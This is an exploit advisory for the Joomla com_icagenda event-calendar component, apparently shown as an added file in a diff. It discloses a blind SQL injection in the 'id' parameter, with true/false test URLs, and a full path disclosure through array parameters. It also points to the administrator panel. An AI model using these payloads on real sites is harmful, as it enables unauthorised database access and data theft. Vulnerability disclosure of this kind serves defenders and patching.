@@ -1,0 +1,44 @@
+# Souhail Hammou - Independant Security Researcher & Penetration Tester .
+# Facebook : www.facebook.com/dark.puzzle.sec
+# E-mail   : dark-puzzle@live.fr
+# Greetings to all moroccan researchers and white hats .
+------------------------------------------------------------------------------
+# Exploit Title: Joomla Component (com_icagenda) Multiple Vulnerabilities . 
+# Author: Dark-Puzzle (Souhail Hammou)
+# Risk : Critical
+# Version: All Versions
+# Google Dork : N/A
+# Category: Webapps
+# Tested on: Windows Xp Sp2 Fr .
+# OSVDB ID : 85147 and 85148 .
+# OSVDB Links : http://osvdb.org/show/osvdb/85148 & http://osvdb.org/show/osvdb/85147
+***************************************************************************************
+Info :
+
+Icagenda is a New Component for Event Management with a calendar module.
+----------------------------------------------------
+I - Blind SQL Injection Vulnerability 
+----------------------------------------------------
+
+Vulnerability :
+
+"id" parameter in com_icagenda is prone to a Blind SQL Vulnerability . An attacker can retrieve & steal data by sending series of 		True and False Queries through SQL statements .
+Here the invisible content shows us that the target suffers from Blind SQL Injection Vulnerability .
+
+	Example : 
+
+	server/index.php?option=com_icagenda&view=list&layout=event&Itemid=520&id=1 and 1=1 (True)
+	server/index.php?option=com_icagenda&view=list&layout=event&Itemid=520&id=1 and 1=2 (False)
+
+	
+	ADMIN PANEL : http://target/administrator
+	
+-----------------------------------------------------
+II - Full Path Disclosure Vulnerability 
+-----------------------------------------------------
+The Full path can be retrieved using Array method [] in ItemID & id Parameters .
+	
+	Example :
+	
+	http://server/index.php?option=com_icagenda&view=list&layout=event&Itemid=520&id[]=1
+		
